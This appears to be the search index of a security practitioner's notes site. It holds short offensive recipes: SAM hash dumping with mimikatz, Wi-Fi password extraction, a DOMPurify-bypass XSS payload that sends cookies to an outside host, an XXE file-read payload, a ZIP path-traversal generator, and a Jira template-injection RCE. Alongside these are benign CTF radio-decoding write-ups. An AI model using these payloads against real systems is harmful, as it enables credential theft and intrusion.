in Python"},{"location":"windows/#get-ntp-configuration-server","text":"$ w32tm /query /status","title":"Get NTP configuration server"},{"location":"windows/#windows-10-versions","text":"Release Informations","title":"Windows 10 versions"},{"location":"windows/#sam-and-system-backup","text":"reg save HKLM\\SYSTEM SystemBkup.hiv reg save HKLM\\SAM SamBkup.hiv Then with mimikatz you can recover the hashes: > lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv","title":"SAM and SYSTEM backup"},{"location":"windows/#list-email-aliases","text":"$ (Get-ADUser -Identity <user_ad_id> -Properties proxyAddresses).proxyAddresses","title":"List Email aliases"},{"location":"windows/#truster-account","text":"The PDF from SSTIC 2014 describes trusts accounts on Windows: sAMAccountType: 805306370 = ( TRUST_ACCOUNT );","title":"Truster Account"},{"location":"windows/#compile-net-without-visual-studio","text":"> cd \\Windows\\Microsoft.NET\\Framework\\v4* > msbuild \"path\\to\\SharpUp-master\\SharpUp.sln\" /t:Rebuild /p:Configuration=Release /p:Platform=\"Any CPU\" Or to compile a single file: > cd \\Windows\\Microsoft.NET\\Framework\\v4.0.30319 > csc.exe /t:exe /out:path\\to\\main.exe path\\to\\main.cs using System; public class HelloWorld { public static void Main() { Console.WriteLine(\"Hello world!\"); } }","title":"Compile .Net without Visual Studio"},{"location":"windows/#list-wifi-networks-and-password","text":"> netsh wlan show profile > netsh wlan show profile <WiFi name> key=clear","title":"List Wifi networks and password"},{"location":"xss/","text":"XSS Cheat sheet https://portswigger.net/web-security/cross-site-scripting/cheat-sheet DOMPurify 2.0 bypass https://research.securitum.com/dompurify-bypass-using-mxss/ http://qual-challs.rtfm.re:8080/?layout=<svg></p><style><a%20id=\"</style><style>%40keyframes%20slidein%20%7B%7D<%2Fstyle><a%20style%3D%27animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%27%20onanimationiteration%3Ddocument.location=%27https:%2F%2Fpostb.in%2F1570471277352-2268189566675%2F%27+document.cookie><%2Fa>%20\">","title":"XSS"},{"location":"xss/#xss","text":"","title":"XSS"},{"location":"xss/#cheat-sheet","text":"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet","title":"Cheat sheet"},{"location":"xss/#dompurify-20-bypass","text":"https://research.securitum.com/dompurify-bypass-using-mxss/ http://qual-challs.rtfm.re:8080/?layout=<svg></p><style><a%20id=\"</style><style>%40keyframes%20slidein%20%7B%7D<%2Fstyle><a%20style%3D%27animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%27%20onanimationiteration%3Ddocument.location=%27https:%2F%2Fpostb.in%2F1570471277352-2268189566675%2F%27+document.cookie><%2Fa>%20\">","title":"DOMPurify 2.0 bypass"},{"location":"xxe/","text":"XML External Entity <!--?xml version=\"1.0\" ?--> <!DOCTYPE message [ <!ENTITY %local_dtd SYSTEM \"file://usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ' <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; '> %local_dtd; ]> <message>...<message>","title":"XXE"},{"location":"xxe/#xml-external-entity","text":"<!--?xml version=\"1.0\" ?--> <!DOCTYPE message [ <!ENTITY %local_dtd SYSTEM \"file://usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ' <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; '> %local_dtd; ]> <message>...<message>","title":"XML External Entity"},{"location":"zip/","text":"ZIP Exploit Path Traversal on decompress Some programs do not check the zip path while extracting the archive. Then it's possible to exploit this to extract a file to a custom location. import os import zipfile def zip(dst): zf = zipfile.ZipFile('%s.zip' % dst, 'w', zipfile.ZIP_DEFLATED) zf.writestr('../../../../../../../tmp/test.txt', 'toto') if __name__ == '__main__': zip('test')","title":"Zip"},{"location":"zip/#zip","text":"","title":"ZIP"},{"location":"zip/#exploit-path-traversal-on-decompress","text":"Some programs do not check the zip path while extracting the archive. Then it's possible to exploit this to extract a file to a custom location. import os import zipfile def zip(dst): zf = zipfile.ZipFile('%s.zip' % dst, 'w', zipfile.ZIP_DEFLATED) zf.writestr('../../../../../../../tmp/test.txt', 'toto') if __name__ == '__main__': zip('test')","title":"Exploit Path Traversal on decompress"},{"location":"cve/CVE-2019-11581/","text":"RCE in Jira(CVE-2019\u201311581) The \"contact Admin\" functinality is accessible on this URL: https://jiraserver/secure/ContactAdministrators!default.jspa The Subject field is vulnerable to Template-Injection (freemarker): $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cmd').waitFor() For example, the command can be: curl http://<ip>:<port>/ to test if the serveur can make an HTTP request outside python -c '' to execute commands such as a reverse-shell","title":"CVE-2019-11581"},{"location":"cve/CVE-2019-11581/#rce-in-jiracve-201911581","text":"The \"contact Admin\" functinality is accessible on this URL: https://jiraserver/secure/ContactAdministrators!default.jspa The Subject field is vulnerable to Template-Injection (freemarker): $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cmd').waitFor() For example, the command can be: curl http://<ip>:<port>/ to test if the serveur can make an HTTP request outside python -c '' to execute commands such as a reverse-shell","title":"RCE in Jira(CVE-2019\u201311581)"},{"location":"cve/CVE-2019-1388/","text":"Windows Privilege Escalation Through UAC (CVE-2019-1388) ZeroDay initiative explains on a YouTube video how to exploit pass System on a Windows 7 machine (CVE-2019-1388). First you need an executable that is signed with a custom certificat. They use httpud.exe that you can download here or you can decode the one provided here . > certuril -decode httpud.asc httpud.exe","title":"CVE-2019-1388"},{"location":"cve/CVE-2019-1388/#windows-privilege-escalation-through-uac-cve-2019-1388","text":"ZeroDay initiative explains on a YouTube video how to exploit pass System on a Windows 7 machine (CVE-2019-1388). First you need an executable that is signed with a custom certificat. They use httpud.exe that you can download here or you can decode the one provided here . > certuril -decode httpud.asc httpud.exe","title":"Windows Privilege Escalation Through UAC (CVE-2019-1388)"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/","text":"WRITE UP - INS'HACK 2019: CHALLS DONT MATTER ANYMORE This is a write-up for the challs dont matter anymore challenge of INS\u2019hAck 2019 by LarsH on behalf of team HackingForSoju. Description You\u2019ve definitely pissed off these aliens by breaking their secret transmission methods ! Now they have 8 devices transmitting on the same frequency, using 32-bit synchronous CDMA. One of the devices is sending unencrypted codes, this is our chance ! The intercepted transmission is in this file. Attached is the file CDMA_interception.wav. Analysis So we are given the information that the data is sent using CDMA. Several signals can be transmitted with CDMA using orthogonal codes, wikipedia page. If we look at how the input data looks in Audacity, we can see that the signal seems to be partwise constant in blocks of 100 samples with some noise added. We can compute the mean value for every time slot and plot. wav = wavio.read('CDMA_interception.wav') means = wav.data.reshape((wav.data.size/100,100)).mean(axis=1) plt.hist(means,bins=1000) plt.plot(sorted(means),range(len(means))) The mean values for the time slots separate into several distinct groups, depending of what the transmitters send. This is the interference pattern. The first side groups are located at +/-7500, so we can compute the number of the bin by dividing by 7500 and rounding to the nearest integer. We were given that the transmission uses 32-bit codes, so we can reshape the data into a matrix with 32 columns and find an orthogonal base in that data set. There are several ways, but LLL-lattice reduction worked fine. matrix = (means.reshape((means.size/32,32))/7500.0).round().astype(int) base = reduceLattice(matrix) This gave 8 base vectors that span the data set. (It was at this stage the smell of flag started to show, as we were given the information that there were 8 devices.) The base was: [ 1, 1, 1, 1,-1,-1, 1, 1,-1,-1, 1,-1, 1,-1,-1,-1, 1,-1,-1,-1,-1,-1, 1,-1, 1, 1, 1, 1,-1,-1, 1, 1] [-1,-1, 1, 1, 1,-1,-1, 1,-1, 1, 1,-1,-1,-1, 1,-1, 1, 1, 1, 1,-1, 1, 1,-1, 1,-1,-1,-1, 1, 1, 1, 1] [ 1,-1, 1, 1, 1,-1,-1,-1,-1,-1,-1,-1,-1,-1, 1, 1,-1, 1,-1,-1,-1,-1,-1, 1,-1,-1, 1, 1, 1,-1,-1, 1] [-1, 1, 1, 1,-1,-1,-1,-1, 1,-1, 1, 1, 1,-1,-1,-1,-1, 1, 1, 1, 1,-1,-1, 1,-1, 1,-1, 1, 1, 1, 1, 1] [ 0, 1,-1,-1,-1,-2, 1, 2, 0, 2, 0,-2, 0, 0, 0,-1, 3,-1, 2,-1,-1,-1, 3,-3, 0,-2, 0,-1,-1, 0, 1, 0] [-1, 0, 0, 0,-2, 1, 2,-1, 1,-1, 3, 1, 3,-1,-1, 0, 0,-2,-1, 2, 2, 0, 0, 0, 1, 3, 1, 2, 0,-1, 0, 1] [-1, 1,-1, 1,-1,-1,-1, 1, 1, 1,-1,-1, 1, 1, 1,-1, 1, 1, 1,-1,-1,-1,-1, 1,-1,-1, 1,-1,-1,-1, 1,-1] [ 1, 0, 2, 0, 2, 1, 2, 1,-1, 1, 1,-1,-1, 1,-1,-2, 0,-2,-1, 0,-2, 2, 2,-2, 3, 1,-1, 0, 0, 1, 2,-1] We can see that this base is not perfect, as all base vectors should have been 1 or -1. This is because LLL minimizes vectors with the L2-norm, not the L-inf-norm. But the base was good enough to use, if we just reduce the rawdata after decoding with this base. To decode the data, we take the dot product with the base and reduce again: rawdata = base.dot(matrix.transpose()) data = reduceLattice(rawdata) Source code This script solves the challenge: import wavio, fpylll, bitarray, numpy def reduceLattice(lattice): A = fpylll.IntegerMatrix.from_matrix(lattice) M = fpylll.GSO.Mat(A) M.update_gso() L = fpylll.LLL.Reduction(M) L() return numpy.array(map(list, A), dtype=int) wav = wavio.read('CDMA_interception.wav') # Compute mean values for every time slot means = wav.data.reshape((wav.data.size/100,100)).mean(axis=1) # Convert mean values to integers and reshape into matrix of data matrix = (means.reshape((means.size/32,32))/7500.0).round().astype(int) # Get reduced basis for matrix through lattice reduction base = reduceLattice(matrix)[:8] # Compute raw data through dot product with basis rawdata = base.dot(matrix.transpose()) # Reduce raw data more, as base is not perfect data = reduceLattice(rawdata) # To through all 8 data streams and print flag if found for d in data: plaintext = bitarray.bitarray(list(d<0),endian='big').tobytes() if 'INSA' in plaintext: print plaintext Running it gives the flag: $ python solve.py Oh hi, I see you've found my secret device. Want a flag ? Here you go INSA{Elektr0nenklange_Aus_d3m_R4di0l4nD}","title":"Challs Dont Matter Anymore"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/#write-up-inshack-2019-challs-dont-matter-anymore","text":"This is a write-up for the challs dont matter anymore challenge of INS\u2019hAck 2019 by LarsH on behalf of team HackingForSoju.","title":"WRITE UP - INS'HACK 2019: CHALLS DONT MATTER ANYMORE"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/#description","text":"You\u2019ve definitely pissed off these aliens by breaking their secret transmission methods ! Now they have 8 devices transmitting on the same frequency, using 32-bit synchronous CDMA. One of the devices is sending unencrypted codes, this is our chance ! The intercepted transmission is in this file. Attached is the file CDMA_interception.wav.","title":"Description"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/#analysis","text":"So we are given the information that the data is sent using CDMA. Several signals can be transmitted with CDMA using orthogonal codes, wikipedia page. If we look at how the input data looks in Audacity, we can see that the signal seems to be partwise constant in blocks of 100 samples with some noise added. We can compute the mean value for every time slot and plot. wav = wavio.read('CDMA_interception.wav') means = wav.data.reshape((wav.data.size/100,100)).mean(axis=1) plt.hist(means,bins=1000) plt.plot(sorted(means),range(len(means))) The mean values for the time slots separate into several distinct groups, depending of what the transmitters send. This is the interference pattern. The first side groups are located at +/-7500, so we can compute the number of the bin by dividing by 7500 and rounding to the nearest integer. We were given that the transmission uses 32-bit codes, so we can reshape the data into a matrix with 32 columns and find an orthogonal base in that data set. There are several ways, but LLL-lattice reduction worked fine. matrix = (means.reshape((means.size/32,32))/7500.0).round().astype(int) base = reduceLattice(matrix) This gave 8 base vectors that span the data set. (It was at this stage the smell of flag started to show, as we were given the information that there were 8 devices.) The base was: [ 1, 1, 1, 1,-1,-1, 1, 1,-1,-1, 1,-1, 1,-1,-1,-1, 1,-1,-1,-1,-1,-1, 1,-1, 1, 1, 1, 1,-1,-1, 1, 1] [-1,-1, 1, 1, 1,-1,-1, 1,-1, 1, 1,-1,-1,-1, 1,-1, 1, 1, 1, 1,-1, 1, 1,-1, 1,-1,-1,-1, 1, 1, 1, 1] [ 1,-1, 1, 1, 1,-1,-1,-1,-1,-1,-1,-1,-1,-1, 1, 1,-1, 1,-1,-1,-1,-1,-1, 1,-1,-1, 1, 1, 1,-1,-1, 1] [-1, 1, 1, 1,-1,-1,-1,-1, 1,-1, 1, 1, 1,-1,-1,-1,-1, 1, 1, 1, 1,-1,-1, 1,-1, 1,-1, 1, 1, 1, 1, 1] [ 0, 1,-1,-1,-1,-2, 1, 2, 0, 2, 0,-2, 0, 0, 0,-1, 3,-1, 2,-1,-1,-1, 3,-3, 0,-2, 0,-1,-1, 0, 1, 0] [-1, 0, 0, 0,-2, 1, 2,-1, 1,-1, 3, 1, 3,-1,-1, 0, 0,-2,-1, 2, 2, 0, 0, 0, 1, 3, 1, 2, 0,-1, 0, 1] [-1, 1,-1, 1,-1,-1,-1, 1, 1, 1,-1,-1, 1, 1, 1,-1, 1, 1, 1,-1,-1,-1,-1, 1,-1,-1, 1,-1,-1,-1, 1,-1] [ 1, 0, 2, 0, 2, 1, 2, 1,-1, 1, 1,-1,-1, 1,-1,-2, 0,-2,-1, 0,-2, 2, 2,-2, 3, 1,-1, 0, 0, 1, 2,-1] We can see that this base is not perfect, as all base vectors should have been 1 or -1. This is because LLL minimizes vectors with the L2-norm, not the L-inf-norm. But the base was good enough to use, if we just reduce the rawdata after decoding with this base. To decode the data, we take the dot product with the base and reduce again: rawdata = base.dot(matrix.transpose()) data = reduceLattice(rawdata)","title":"Analysis"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/#source-code","text":"This script solves the challenge: import wavio, fpylll, bitarray, numpy def reduceLattice(lattice): A = fpylll.IntegerMatrix.from_matrix(lattice) M = fpylll.GSO.Mat(A) M.update_gso() L = fpylll.LLL.Reduction(M) L() return numpy.array(map(list, A), dtype=int) wav = wavio.read('CDMA_interception.wav') # Compute mean values for every time slot means = wav.data.reshape((wav.data.size/100,100)).mean(axis=1) # Convert mean values to integers and reshape into matrix of data matrix = (means.reshape((means.size/32,32))/7500.0).round().astype(int) # Get reduced basis for matrix through lattice reduction base = reduceLattice(matrix)[:8] # Compute raw data through dot product with basis rawdata = base.dot(matrix.transpose()) # Reduce raw data more, as base is not perfect data = reduceLattice(rawdata) # To through all 8 data streams and print flag if found for d in data: plaintext = bitarray.bitarray(list(d<0),endian='big').tobytes() if 'INSA' in plaintext: print plaintext Running it gives the flag: $ python solve.py Oh hi, I see you've found my secret device. Want a flag ? Here you go INSA{Elektr0nenklange_Aus_d3m_R4di0l4nD}","title":"Source code"},{"location":"sdr/challs-dont-matter-anymore/writeup/","text":"import wave import matplotlib.pyplot as plt import struct CODE_LENGTH = 32 assert CODE_LENGTH%2 == 0 N_HOSTS = 8 N_BITS = 880 wav = wave.open('CDMA_interception.wav', 'r') raw_signal=[] for i in range(N_BITS*CODE_LENGTH): frames = wav.readframes(100) samples = struct.unpack('h'*100, frames) raw_signal.append(sum(samples)/100) buckets = [ (2000, 6000), (8000, 13000), (15000, 21000), (22500, 28000), (30000, 36000), (38000, 43000), (45500, 50000), (53000, 57500), (60000, 63000)] signal = [] for sig in raw_signal: for i in range(10): if buckets[i][0]<=sig+32768<=buckets[i][1]: signal.append(float(i)/N_HOSTS) break codeset = set() for veci in range(0,CODE_LENGTH*N_BITS,CODE_LENGTH): vec = [round(s*N_HOSTS) for s in signal[veci:veci+CODE_LENGTH]] codeset.add(tuple(vec)) print len(codeset) codelist = list(codeset) recovered_codes = set() for i in range(len(codelist)): similar = [] for j in range(len(codelist)): if i==j: continue if all(abs(b-a)<=1 for b,a in zip(codelist[i], codelist[j])): similar.append(i) recovered_codes.add(tuple([b-a for b,a in zip(codelist[i], codelist[j])])) print len(recovered_codes) for rc in recovered_codes: code = [bool(c+1.) for c in rc] recovered_sig = [] for nbit, veci in enumerate(range(0,CODE_LENGTH*N_BITS,CODE_LENGTH)): vec = [round(s*N_HOSTS) for s in signal[veci:veci+CODE_LENGTH]] nvec = [v*2-5 for v in vec] res = sum(rci*nvi for rci, nvi in zip(rc, nvec)) recovered_sig.append(res) assert len(set(recovered_sig)) == 2 mx = max(recovered_sig) sig = '' ch = '' for rsg in recovered_sig: ch += '1' if rsg==mx else '0' if len(ch) == 8: sig += chr(int(ch,2)) ch = '' print sig print '\\n\\n==================\\n\\n'","title":"Writeup"},{"location":"sdr/lit-fam/hackingforsoju/","text":"WRITE UP - INS'HACK 2019: LIT FAM This is a write-up for the LIT FAM dual challenge of INS\u2019hAck 2019 by LarsH on behalf of team HackingForSoju. Description We have a proof of extraterrestrial life ! Or is it just a random amateur radio operator ? Anyway, here is a strange RF interception. The file contains two independent flags The RF interception was given as a WAV file, and The A-part flag matches INSA{[A-Z]+} and the F-part matches INSA{[A-Za-z0-9_]+}. Initial analysis If we open the WAV file in Audacity and zoom in, we can see that the file consists of sine-waves with two different frequencies. This is called FSK modulation, the changing frequency is used to encode the data. If we zoom out a bit more, we can see that the amplitude of the FSK signal varies and encodes an analog signal. This is AM, amplitude modulation, the amplitude is used to encode the data. Decoding FSK There are several ways to decode an FSK signal, but as we have a pure sine wave there is a special trick. The trick is based on the fact that the second derivative of sin(w*x) is -w*w * sin(w*x) . If we take the second derivative and divide by the original function value we get -w**2 , so we can extract the time. We have a sampled sine wave in discrete time f(n) = A * sin(n*dt*w) , so we can not get the exact derivative, but we can use approximations and simplifications. It will be enough to decode the data. The second derivative (ignoring discretization constant) can be approximated with f''(n) = f(n-1) - 2*f(n) + f(n+1) = = A * (sin(n*dt*w - dt*w) - 2*sin(n*dt*w) + sin(n*dt*w + dt*w)) = = A * (sin(n*dt*w)*cos(dt*w) - cos(n*dt*w)*sin(dt*w) - 2*sin(n*dt*w) + sin(n*dt*w)*cos(dt*w) + cos(n*dt*w)*sin(w*t) = = A * (2*sin(n*dt*w)*cos(dt*w) - 2*sin(n*dt*w)) = = A * 2 * sin(n*dt*w) * (cos(dt*w) - 1) so the value of f''(n) / f(n) is f''(n) / f(n) = (A * 2 * sin(n*dt*w) * (cos(dt*w) - 1)) / A*sin(n*dt*w) = = 2 * (cos(dt*w - 1) This expression only depends on the frequency of the signal, wich is the quantity we want to extract! We can now decode and plot the raw frequency dependent data: import wavio from matplotlib import pyplot as plt wav = wavio.read('FAM.wav') l = [(a-2*b+c) / float(b) for a,b,c in zip(wav.data[:500], wav.data[1:], wav.data[2:])] plt.plot(l) plt.show() The frequency signal is stable at -0.1 and -0.4, except for at the boundaries where the bit level changes. The bits change every 20th sample, so we can reduce the data set by picking every 20th sample, starting at sample 10. We compute the bit value using 0.25 as a threshold value. >>> b = [int(e<-0.25) for e in l][10::20] >>> numpy.array(b[:80]).reshape((10,8)) array([[1, 0, 1, 1, 1, 1, 1, 0], [1, 1, 0, 1, 0, 0, 1, 0], [1, 1, 0, 1, 1, 1, 0, 0], [1, 0, 1, 1, 1, 1, 1, 0], [1, 1, 1, 0, 1, 0, 0, 0], [1, 1, 0, 1, 0, 0, 0, 0], [0, 1, 1, 0, 0, 1, 1, 0], [1, 0, 1, 1, 1, 1, 1, 0], [1, 0, 0, 0, 0, 0, 1, 0], [1, 1, 0, 1, 0, 0, 1, 0]]) We can see that the the last bits align nicely and we should be able to decode this as ASCII. However, the challenge creators put in a small trick. The bytes are stored in big endian with only 7 bits given for the first byte. One way to decode the bits is to add a zero to the beginning and decode using bitarray. Decoding AM The simplest circuit to decode an AM signal with is a diode receiver. The digital equivalent is to use the abs() function, we can just write back the rectified data to a WAV-file and listen to it. Solution script This is the final solution script: import wavio, bitarray wav = wavio.read('FAM.wav') wavio.write('rectified.wav', abs(wav.data), wav.rate) l = [(a-2*b+c) / float(b) for a,b,c in zip(wav.data[:10000], wav.data[1:], wav.data[2:])] print bitarray.bitarray([0]+[int(e<-0.25) for e in l][10::20]).tobytes() Running the script prints the the flag _in_th3_AiR_4_u_4nd_Me}INSA{iS_in_th3_AiR_4_u_4nd_Me}INSA{iS_ih* and if we listen to the file rectified.wav we can hear some space sounds followed by the voice message: The flag is I, N, S, A, opening bracket, RADIOACTIVITY, closing bracket. All letters are in uppercase. so the flag is INSA{RADIOACTIVITY}.","title":"lit-fam"},{"location":"sdr/lit-fam/hackingforsoju/#write-up-inshack-2019-lit-fam","text":"This is a write-up for the LIT FAM dual challenge of INS\u2019hAck 2019 by LarsH on behalf of team HackingForSoju.","title":"WRITE UP - INS'HACK 2019: LIT FAM"},{"location":"sdr/lit-fam/hackingforsoju/#description","text":"We have a proof of extraterrestrial life ! Or is it just a random amateur radio operator ? Anyway, here is a strange RF interception. The file contains two independent flags The RF interception was given as a WAV file, and The A-part flag matches INSA{[A-Z]+} and the F-part matches INSA{[A-Za-z0-9_]+}.","title":"Description"},{"location":"sdr/lit-fam/hackingforsoju/#initial-analysis","text":"If we open the WAV file in Audacity and zoom in, we can see that the file consists of sine-waves with two different frequencies. This is called FSK modulation, the changing frequency is used to encode the data. If we zoom out a bit more, we can see that the amplitude of the FSK signal varies and encodes an analog signal. This is AM, amplitude modulation, the amplitude is used to encode the data.","title":"Initial analysis"},{"location":"sdr/lit-fam/hackingforsoju/#decoding-fsk","text":"There are several ways to decode an FSK signal, but as we have a pure sine wave there is a special trick. The trick is based on the fact that the second derivative of sin(w*x) is -w*w * sin(w*x) . If we take the second derivative and divide by the original function value we get -w**2 , so we can extract the time. We have a sampled sine wave in discrete time f(n) = A * sin(n*dt*w) , so we can not get the exact derivative, but we can use approximations and simplifications. It will be enough to decode the data. The second derivative (ignoring discretization constant) can be approximated with f''(n) = f(n-1) - 2*f(n) + f(n+1) = = A * (sin(n*dt*w - dt*w) - 2*sin(n*dt*w) + sin(n*dt*w + dt*w)) = = A * (sin(n*dt*w)*cos(dt*w) - cos(n*dt*w)*sin(dt*w) - 2*sin(n*dt*w) + sin(n*dt*w)*cos(dt*w) + cos(n*dt*w)*sin(w*t) = = A * (2*sin(n*dt*w)*cos(dt*w) - 2*sin(n*dt*w)) = = A * 2 * sin(n*dt*w) * (cos(dt*w) - 1) so the value of f''(n) / f(n) is f''(n) / f(n) = (A * 2 * sin(n*dt*w) * (cos(dt*w) - 1)) / A*sin(n*dt*w) = = 2 * (cos(dt*w - 1) This expression only depends on the frequency of the signal, wich is the quantity we want to extract! We can now decode and plot the raw frequency dependent data: import wavio from matplotlib import pyplot as plt wav = wavio.read('FAM.wav') l = [(a-2*b+c) / float(b) for a,b,c in zip(wav.data[:500], wav.data[1:], wav.data[2:])] plt.plot(l) plt.show() The frequency signal is stable at -0.1 and -0.4, except for at the boundaries where the bit level changes. The bits change every 20th sample, so we can reduce the data set by picking every 20th sample, starting at sample 10. We compute the bit value using 0.25 as a threshold value. >>> b = [int(e<-0.25) for e in l][10::20] >>> numpy.array(b[:80]).reshape((10,8)) array([[1, 0, 1, 1, 1, 1, 1, 0], [1, 1, 0, 1, 0, 0, 1, 0], [1, 1, 0, 1, 1, 1, 0, 0], [1, 0, 1, 1, 1, 1, 1, 0], [1, 1, 1, 0, 1, 0, 0, 0], [1, 1, 0, 1, 0, 0, 0, 0], [0, 1, 1, 0, 0, 1, 1, 0], [1, 0, 1, 1, 1, 1, 1, 0], [1, 0, 0, 0, 0, 0, 1, 0], [1, 1, 0, 1, 0, 0, 1, 0]]) We can see that the the last bits align nicely and we should be able to decode this as ASCII. However, the challenge creators put in a small trick. The bytes are stored in big endian with only 7 bits given for the first byte. One way to decode the bits is to add a zero to the beginning and decode using bitarray.","title":"Decoding FSK"},{"location":"sdr/lit-fam/hackingforsoju/#decoding-am","text":"The simplest circuit to decode an AM signal with is a diode receiver. The digital equivalent is to use the abs() function, we can just write back the rectified data to a WAV-file and listen to it.","title":"Decoding AM"},{"location":"sdr/lit-fam/hackingforsoju/#solution-script","text":"This is the final solution script: import wavio, bitarray wav = wavio.read('FAM.wav') wavio.write('rectified.wav', abs(wav.data), wav.rate) l = [(a-2*b+c) / float(b) for a,b,c in zip(wav.data[:10000], wav.data[1:], wav.data[2:])] print bitarray.bitarray([0]+[int(e<-0.25) for e in l][10::20]).tobytes() Running the script prints the the flag _in_th3_AiR_4_u_4nd_Me}INSA{iS_in_th3_AiR_4_u_4nd_Me}INSA{iS_ih* and if we listen to the file rectified.wav we can hear some space sounds followed by the voice message: The flag is I, N, S, A, opening bracket, RADIOACTIVITY, closing bracket. All letters are in uppercase. so the flag is INSA{RADIOACTIVITY}.","title":"Solution script"},{"location":"sdr/lit-fam/writeup/","text":"import struct import wave wav = wave.open('FAM.wav', 'r') am_sig = [] nframes = wav.getnframes() frames = wav.readframes(nframes) samples = struct.unpack('h'*nframes, frames) lastinvert = 0 sgn = 1 fm_sig='' for i in range(15,nframes,20): sv = max(map(abs,samples[i:i+20])) am_sig.append(sv*2-32768) switchcnt = 0 for j in range(19): if samples[i+j]*samples[i+j+1]<0: switchcnt += 1 fm_sig += '1' if switchcnt > 2 else '0' # INSA{iS_in_th3_AiR_4_u_4nd_Me} for cut in range(8): s = fm_sig[cut:800+cut] print ''.join(chr(int(s[i*8:i*8+8],2)) for i in range(len(s)//8)) # INSA{RADIOACTIVITY} output_wav = wave.open('extracted_am.wav', 'w') output_wav.setparams((1, 2, 44100, 0, 'NONE', 'not compressed')) packed_values=[] for sample in am_sig: packed_values.append(struct.pack('h', sample)) output_wav.writeframes(''.join(packed_values)) output_wav.close()","title":"Writeup"}]}